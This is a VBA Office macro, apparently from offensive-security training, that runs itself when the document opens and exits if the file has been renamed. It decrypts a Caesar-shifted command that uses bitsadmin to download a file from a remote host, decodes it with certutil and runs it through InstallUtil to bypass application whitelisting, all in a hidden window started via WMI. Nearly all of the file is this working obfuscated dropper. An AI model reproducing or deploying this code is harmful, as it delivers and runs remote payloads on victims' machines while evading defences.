' Decrypt character using Caesar cipher value of 17
Function DecryptChar(encryptedChar)
    DecryptChar = Chr(encryptedChar - 17)
End Function

' Fetch next three characters of encrypted string
Function GetNextChar(cipherText)
    GetNextChar = Left(cipherText, 3)
End Function

' Overwrite encrypted string to exclude characters that were just decrypted
Function Overwrite(cipherText)
    Overwrite = Right(cipherText, Len(cipherText) - 3)
End Function

' Loop through encrypted string
Function Decrypt(cipherText)
    Do
    decryptedString = decryptedString + DecryptChar(GetNextChar(cipherText))
    cipherText = Overwrite(cipherText)
    Loop While Len(cipherText) > 0
    Decrypt = decryptedString
End Function

Function MyMacro()
    ' Don't run if file was renamed
    If ActiveDocument.Name <> "decryptor.doc" Then
        Exit Function
    End If

    Dim encryptedPayload As String
    Dim decryptedPayload As String
    ' Result of caesar_encrypt_installutil_for_vba.ps1
    encryptedPayload = "116126117049064116049115122133132114117126122127049064101131114127132119118131049126138091128115049121133133129075064064066074067063066071073063069074063073069064118127116063133137133049116075109102132118131132109132133134117118127133109118127116063133137133049055055049116118131133134133122125049062117118116128117118049116075109102132118131132109132133134117118127133109118127116063133137133049116075109102132118131132109132133134117118127133109090127132133114125125102133122125083138129114132132063118137118049055055049117118125049116075109102132118"
    encryptedPayload = encryptedPayload & "131132109132133134117118127133109118127116063133137133049055055049084075109104122127117128136132109094122116131128132128119133063095086101109087131114126118136128131124071069109135069063065063068065068066074109122127132133114125125134133122125063118137118049064125128120119122125118078049064093128120101128084128127132128125118078119114125132118049064102049084075109102132118131132109132133134117118127133109090127132133114125125102133122125083138129114132132063118137118049055055049117118125049116075109102132118131132109132133134117118127133109090127132133114125125102133122125083138129114132132063118137118"
    decryptedPayload = Decrypt(encryptedPayload)
    
    ' Configure Process to run in a hidden window
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    errReturn = objProcess.Create(decryptedPayload, Null, objConfig, pid)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub